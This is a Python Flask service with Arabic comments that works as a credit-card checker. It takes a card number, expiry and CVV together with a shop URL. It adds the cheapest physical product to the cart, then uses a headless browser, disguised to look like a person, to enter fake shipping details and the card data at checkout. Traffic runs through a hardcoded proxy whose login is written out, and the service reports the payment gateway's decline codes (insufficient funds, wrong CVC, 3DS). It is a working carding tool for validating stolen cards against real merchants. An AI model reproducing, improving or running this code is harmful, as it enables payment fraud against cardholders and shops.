# app.py - ملف API كامل لـ Railway (نسخة عالمية محسنة)
import time
import re
import json
import requests
from urllib.parse import urljoin
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait, Select
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.keys import Keys
from flask import Flask, request, jsonify
import os

app = Flask(__name__)

def ff(ccx, site):
    """
    ccx: رقم البطاقة|الشهر|السنة|cvv
    مثال: '4918460118934875|08|2027|293'
    site: رابط الموقع
    مثال: 'https://www.militadowatch.com/'
    """
    
    # إعدادات البروكسي
    proxy_host = "px043006.pointtoserver.com"
    proxy_port = "10780"
    proxy_user = "purevpn0s11340994"
    proxy_pass = "ak3t35fp"
    
    # تنسيق البروكسي لـ requests
    proxies = {
        "http": f"http://{proxy_user}:{proxy_pass}@{proxy_host}:{proxy_port}",
        "https": f"http://{proxy_user}:{proxy_pass}@{proxy_host}:{proxy_port}"
    }
    
    shipping_data = {
        "email": "jbyyt@hi2.in",
        "first_name": "Lawrence",
        "last_name": "Barnett",
        "address1": "new york",
        "city": "New York",
        "state": "New York",
        "zip": "10080",
        "phone": "2012583991",
        "country": "United States"
    }
    
    parts = ccx.split('|')
    if len(parts) != 4:
        return {"success": False, "code": None, "error": "Invalid card format"}
    
    card_data = {
        "number": parts[0].strip(),
        "expiry": f"{parts[1].strip()}/{parts[2].strip()[-2:]}",
        "cvv": parts[3].strip(),
        "name": "Lawrence Barnett"
    }
    
    found_code = None
    response_result = None
    total_amount = "$1.00"
    base_url = site.rstrip('/')
    
    # ==================== 1. جلب رابط الدفع ====================
    try:
        s = requests.Session()
        s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
        
        digital_keywords = [
            'worry-free', 'protection', 'insurance', 'warranty', 'digital', 
            'download', 'ebook', 'pdf', 'gift card', 'membership', 'subscription',
            'service', 'guarantee', 'support'
        ]
        
        r = s.get(urljoin(site, '/products.json?limit=250'), proxies=proxies, timeout=15)
        if r.status_code != 200:
            return {"success": False, "code": None, "error": f"Failed to fetch products: {r.status_code}"}
        
        products_data = r.json()
        shippable_products = []
        
        for p in products_data.get('products', []):
            title = p.get('title', '').lower()
            product_type = p.get('product_type', '').lower()
            vendor = p.get('vendor', '').lower()
            
            is_digital = False
            for keyword in digital_keywords:
                if keyword in title or keyword in product_type or keyword in vendor:
                    is_digital = True
                    break
            
            if is_digital:
                continue
            
            for v in p.get('variants', []):
                price = float(v.get('price', 0))
                available = v.get('available', True)
                if price > 0 and available and price >= 0.5:
                    shippable_products.append({
                        'title': p.get('title'),
                        'price': price,
                        'variant_id': v.get('id'),
                        'handle': p.get('handle')
                    })
        
        if not shippable_products:
            return {"success": False, "code": None, "error": "No shippable product"}
        
        cheapest = min(shippable_products, key=lambda x: x['price'])
        variant_id = cheapest['variant_id']
        total_amount = f"${cheapest['price']:.2f}"
        
        resp = s.post(urljoin(site, '/cart/add.js'), json={'quantity': 1, 'id': variant_id}, proxies=proxies, cookies=s.cookies)
        if resp.status_code != 200:
            return {"success": False, "code": None, "error": "Failed to add to cart"}
        
        response = s.post(f'{site}/cart', data={'checkout': ''}, proxies=proxies, cookies=s.cookies, allow_redirects=True)
        checkout_url = response.url
        
    except Exception as e:
        return {"success": False, "code": None, "error": f"Cart Error: {str(e)}"}
    
    # ==================== 2. تشغيل المتصفح ====================
    driver = None
    try:
        chrome_options = Options()
        chrome_options.add_argument('--disable-blink-features=AutomationControlled')
        chrome_options.add_experimental_option('excludeSwitches', ['enable-automation'])
        chrome_options.add_experimental_option('useAutomationExtension', False)
        chrome_options.add_argument('--disable-web-security')
        chrome_options.add_argument('--disable-features=IsolateOrigins,site-per-process')
        chrome_options.add_argument('--disable-popup-blocking')
        chrome_options.add_argument('--disable-dev-shm-usage')
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--disable-gpu')
        chrome_options.add_argument('--disable-notifications')
        chrome_options.add_argument('--start-maximized')
        chrome_options.add_argument('--headless')
        
        # إضافة البروكسي لـ Selenium
        # ملاحظة: البروكسي الذي يتطلب مصادقة (username:password) في Selenium headless يتطلب عادة إضافات (Extensions) 
        # أو استخدام مكتبات مثل selenium-wire. هنا سنستخدم الطريقة القياسية للأرجومنت.
        chrome_options.add_argument(f'--proxy-server=http://{proxy_host}:{proxy_port}')
        
        chrome_options.set_capability('goog:loggingPrefs', {'performance': 'ALL'})
        
        driver = webdriver.Chrome(options=chrome_options)
        
        # تنفيذ المصادقة للبروكسي إذا لزم الأمر (عبر الـ URL أو Script)
        # ملاحظة: المتصفحات تطلب أحياناً نافذة منبثقة للمصادقة، في headless نفضل تمريرها في الـ URL إذا كان الموقع يدعم ذلك
        # أو استخدام selenium-wire إذا كانت البيئة تسمح بتثبيته.
        
        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        wait = WebDriverWait(driver, 20)
        driver.set_page_load_timeout(30)
        
        driver.get(checkout_url)
        time.sleep(5)
        
        # ==================== 3. تعبئة الشحن (نسخة عالمية) ====================
        try:
            # 1. البريد الإلكتروني
            try:
                email_field = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='email'], input[name='email'], #email")))
                email_field.clear()
                email_field.send_keys(shipping_data["email"])
            except: pass
            
            # 2. الدولة (Country) - دعم عالمي
            try:
                country_selectors = ["select[name='countryCode']", "select[name='country']", "#country", "select[autocomplete='shipping country']"]
                for selector in country_selectors:
                    try:
                        country_select = Select(driver.find_element(By.CSS_SELECTOR, selector))
                        try:
                            country_select.select_by_visible_text(shipping_data["country"])
                        except:
                            country_select.select_by_index(1)
                        time.sleep(1)
                        break
                    except: continue
            except: pass

            # 3. الحقول الأساسية
            fields_map = {
                "firstName": ["input[name='firstName']", "#firstName", "input[name='shippingAddress[firstName]']", "input[autocomplete='shipping given-name']"],
                "lastName": ["input[name='lastName']", "#lastName", "input[name='shippingAddress[lastName]']", "input[autocomplete='shipping family-name']"],
                "address1": ["input[name='address1']", "#address1", "input[name='shippingAddress[address1]']", "input[autocomplete='shipping address-line1']"],
                "city": ["input[name='city']", "#city", "input[name='shippingAddress[city]']", "input[autocomplete='shipping address-level2']"],
                "postalCode": ["input[name='postalCode']", "#postalCode", "input[name='shippingAddress[zip]']", "input[autocomplete='shipping postal-code']"],
                "phone": ["input[name='phone']", "#phone", "input[name='shippingAddress[phone]']", "input[type='tel']"]
            }
            
            for key, selectors in fields_map.items():
                val = shipping_data[key] if key in shipping_data else ""
                for selector in selectors:
                    try:
                        elem = driver.find_element(By.CSS_SELECTOR, selector)
                        elem.clear()
                        elem.send_keys(val)
                        break
                    except: continue
            
            # 4. المنطقة/الولاية (Zone/Province)
            try:
                zone_selectors = ["select[name='zone']", "select[name='province']", "#zone", "#province", "select[name='shippingAddress[province]']"]
                for selector in zone_selectors:
                    try:
                        zone_select = Select(driver.find_element(By.CSS_SELECTOR, selector))
                        try:
                            zone_select.select_by_visible_text(shipping_data["state"])
                        except:
                            zone_select.select_by_index(1)
                        break
                    except:
                        try:
                            zone_input = driver.find_element(By.CSS_SELECTOR, selector)
                            zone_input.clear()
                            zone_input.send_keys(shipping_data["state"])
                            break
                        except: continue
            except: pass
            
            time.sleep(2)
            # الضغط على زر الاستمرار
            continue_selectors = [
                "button[type='submit']", 
                "button#continue_button",
                "//button[contains(., 'Continue')]",
                "//button[contains(., 'Shipping')]"
            ]
            
            clicked = False
            for sel in continue_selectors:
                try:
                    if sel.startswith("//"):
                        btn = driver.find_element(By.XPATH, sel)
                    else:
                        btn = driver.find_element(By.CSS_SELECTOR, sel)
                    driver.execute_script("arguments[0].scrollIntoView(true);", btn)
                    time.sleep(0.5)
                    driver.execute_script("arguments[0].click();", btn)
                    clicked = True
                    break
                except: continue
            
            if not clicked:
                driver.find_element(By.TAG_NAME, "body").send_keys(Keys.ENTER)
            
            time.sleep(5)
            
            # إذا كان هناك خطوة ثانية للشحن (Shipping Method)
            if "checkout" in driver.current_url and ("shipping_method" in driver.current_url or "shipping" in driver.current_url):
                for sel in continue_selectors:
                    try:
                        if sel.startswith("//"):
                            btn = driver.find_element(By.XPATH, sel)
                        else:
                            btn = driver.find_element(By.CSS_SELECTOR, sel)
                        driver.execute_script("arguments[0].click();", btn)
                        time.sleep(5)
                        break
                    except: continue

        except Exception as e:
            return {"success": False, "code": None, "error": f"Shipping fill failed: {str(e)}"}
        
        # ==================== 4. تعبئة الدفع (كاملة كما في الأصل) ====================
        try:
            driver.switch_to.default_content()
            time.sleep(2)
            
            iframes = driver.find_elements(By.TAG_NAME, 'iframe')
            
            card_filled = False
            expiry_filled = False
            cvv_filled = False
            name_filled = False
            
            for iframe in iframes:
                try:
                    driver.switch_to.frame(iframe)
                    inputs = driver.find_elements(By.TAG_NAME, 'input')
                    
                    for input_elem in inputs:
                        data_field = input_elem.get_attribute('data-field') or ''
                        placeholder = input_elem.get_attribute('placeholder') or ''
                        autocomplete = input_elem.get_attribute('autocomplete') or ''
                        input_id = input_elem.get_attribute('id') or ''
                        
                        if not card_filled and (data_field == 'number' or 'card number' in placeholder.lower() or autocomplete == 'cc-number'):
                            driver.execute_script("""
                                arguments[0].focus();
                                arguments[0].value = '';
                                arguments[0].value = arguments[1];
                                arguments[0].dispatchEvent(new Event('input', {bubbles: true}));
                                arguments[0].dispatchEvent(new Event('change', {bubbles: true}));
                                arguments[0].dispatchEvent(new Event('blur', {bubbles: true}));
                            """, input_elem, card_data["number"])
                            card_filled = True
                            time.sleep(0.3)
                        
                        elif not expiry_filled and (data_field == 'expiry' or 'expiry' in placeholder.lower() or autocomplete == 'cc-exp'):
                            driver.execute_script("""
                                arguments[0].focus();
                                arguments[0].value = '';
                                arguments[0].value = arguments[1];
                                arguments[0].dispatchEvent(new Event('input', {bubbles: true}));
                                arguments[0].dispatchEvent(new Event('change', {bubbles: true}));
                                arguments[0].dispatchEvent(new Event('blur', {bubbles: true}));
                            """, input_elem, card_data["expiry"])
                            expiry_filled = True
                            time.sleep(0.3)
                        
                        elif not cvv_filled and (data_field == 'cvv' or 'cvv' in placeholder.lower() or autocomplete == 'cc-csc'):
                            driver.execute_script("""
                                arguments[0].focus();
                                arguments[0].value = '';
                                arguments[0].value = arguments[1];
                                arguments[0].dispatchEvent(new Event('input', {bubbles: true}));
                                arguments[0].dispatchEvent(new Event('change', {bubbles: true}));
                                arguments[0].dispatchEvent(new Event('blur', {bubbles: true}));
                            """, input_elem, card_data["cvv"])
                            cvv_filled = True
                            time.sleep(0.3)
                        
                        elif not name_filled and (data_field == 'name' or 'name' in placeholder.lower() or autocomplete == 'cc-name'):
                            driver.execute_script("""
                                arguments[0].focus();
                                arguments[0].value = '';
                                arguments[0].value = arguments[1];
                                arguments[0].dispatchEvent(new Event('input', {bubbles: true}));
                                arguments[0].dispatchEvent(new Event('change', {bubbles: true}));
                                arguments[0].dispatchEvent(new Event('blur', {bubbles: true}));
                            """, input_elem, card_data["name"])
                            name_filled = True
                            time.sleep(0.3)
                    
                    driver.switch_to.default_content()
                    if card_filled and expiry_filled and cvv_filled:
                        break
                except:
                    driver.switch_to.default_content()
                    continue
            
            if not (card_filled and expiry_filled and cvv_filled):
                return {"success": False, "code": None, "error": "Payment fill failed"}
            
        except Exception as e:
            return {"success": False, "code": None, "error": f"Payment error: {str(e)}"}
        
        # ==================== 5. اعتراض GraphQL والضغط على Pay (كاملة) ====================
        try:
            script = """
            window.graphqlBodies = [];
            window.allResponses = [];
            var originalFetch = window.fetch;
            window.fetch = function(url, options) {
                return originalFetch.apply(this, arguments).then(function(response) {
                    var clone = response.clone();
                    clone.text().then(function(text) {
                        window.allResponses.push({url: url, body: text, timestamp: new Date().toISOString()});
                        if (url && url.includes('/checkouts/internal/graphql/persisted')) {
                            window.graphqlBodies.push(text);
                        }
                    });
                    return response;
                });
            };
            var originalXHROpen = XMLHttpRequest.prototype.open;
            var originalXHRSend = XMLHttpRequest.prototype.send;
            XMLHttpRequest.prototype.open = function(method, url) {
                this._url = url;
                return originalXHROpen.apply(this, arguments);
            };
            XMLHttpRequest.prototype.send = function(body) {
                var self = this;
                this.addEventListener('load', function() {
                    try {
                        var text = self.responseText;
                        window.allResponses.push({url: self._url, body: text, timestamp: new Date().toISOString()});
                        if (self._url && self._url.includes('/checkouts/internal/graphql/persisted')) {
                            window.graphqlBodies.push(text);
                        }
                    } catch(e) {}
                });
                return originalXHRSend.apply(this, arguments);
            };
            """
            driver.execute_script(script)
            time.sleep(1)
            
            driver.switch_to.default_content()
            time.sleep(2)
            
            pay_selectors = [
                "//button[contains(text(), 'Pay now')]",
                "//button[contains(text(), 'Complete order')]",
                "//button[@type='submit']"
            ]
            
            pay_button = None
            for xpath in pay_selectors:
                try:
                    buttons = driver.find_elements(By.XPATH, xpath)
                    for button in buttons:
                        if button.is_displayed() and button.is_enabled():
                            pay_button = button
                            break
                    if pay_button: break
                except: continue
            
            if pay_button:
                driver.execute_script("arguments[0].click();", pay_button)
            else:
                driver.execute_script("""
                    var buttons = document.querySelectorAll('button[type="submit"]');
                    for (var i = 0; i < buttons.length; i++) {
                        var text = buttons[i].textContent || '';
                        if (text.includes('Pay now') || text.includes('Pay') || text.includes('Complete')) {
                            buttons[i].click();
                            return true;
                        }
                    }
                """)
            
            # ==================== 6. استخراج وتحليل الردود (كاملة) ====================
            for attempt in range(15):
                time.sleep(2)
                
                # التحقق من URL النجاح
                curr_url = driver.current_url.lower()
                if "thank_you" in curr_url or "post_purchase" in curr_url or "orders" in curr_url or 'Your order is confirmed' in curr_url:
                    return {"success": True, "code": "SUCCESS", "response": "Order Placed!", "price": total_amount}
                
                # التحقق من وجود كابتشا
                if "captcha" in driver.page_source.lower() or "g-recaptcha" in driver.page_source:
                    return {"success": True, "code": "CAPTCHA_REQUIRED", "response": "CAPTCHA_REQUIRED", "price": total_amount}

                responses = driver.execute_script("return window.allResponses || [];")
                for resp in responses:
                    body = resp.get('body', '')
                    if not body: continue
                    
                    # تحليل الردود كما في الأصل
                    if 'INSUFFICIENT_FUNDS' in body:
                        return {"success": True, "code": "INSUFFICIENT_FUNDS", "response": "Insufficient funds", "price": total_amount}
                    if 'INCORRECT_CVC' in body:
                        return {"success": True, "code": "INCORRECT_CVC", "response": "INCORRECT_CVC", "price": total_amount}
                    if 'INCORRECT_ZIP' in body:
                        return {"success": True, "code": "INCORRECT_ZIP", "response": "Incorrect ZIP", "price": total_amount}
                    if 'CompletePaymentChallenge' in body or '/authentications/' in body:
                        return {"success": True, "code": "3DS_REQUIRED", "response": "3DS Secure required", "price": total_amount}
                    
                    # البحث عن code في GraphQL
                    pattern = r'"code"\s*:\s*"([^"]+)"'
                    matches = re.findall(pattern, body, re.IGNORECASE)
                    for code in matches:
                        if len(code) > 3 and len(code) < 50 and ' ' not in code:
                            if 'PAYMENTS_' not in code and 'DELIVERY_' not in code and 'BUYER_' not in code:
                                return {"success": True, "code": code, "response": code, "price": total_amount}

            # البحث في سجلات الأداء إذا لم نجد نتيجة
            logs = driver.get_log('performance')
            for log in logs:
                try:
                    message = json.loads(log['message'])
                    if message.get('message', {}).get('method') == 'Network.responseReceived':
                        request_id = message.get('message', {}).get('params', {}).get('requestId')
                        if request_id:
                            try:
                                response = driver.execute_cdp_cmd('Network.getResponseBody', {'requestId': request_id})
                                body = response.get('body', '')
                                if body:
                                    match = re.search(r'"code"\s*:\s*"([^"]+)"', body)
                                    if match:
                                        code = match.group(1)
                                        if code not in ["SUCCESS", "PENDING"]:
                                            return {"success": True, "code": code, "response": code, "price": total_amount}
                            except: pass
                except: continue

            return {"success": False, "code": None, "error": "Code not found", "price": total_amount}
        
        except Exception as e:
            return {"success": False, "code": None, "error": f"Final Step Error: {str(e)}", "price": total_amount}
            
    finally:
        if driver:
            driver.quit()

@app.route('/', methods=['GET'])
def home():
    cc = request.args.get('cc')
    url = request.args.get('url')
    if not cc or not url:
        return jsonify({"success": False, "error": "Missing parameters"})
    return jsonify(ff(cc, url))

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
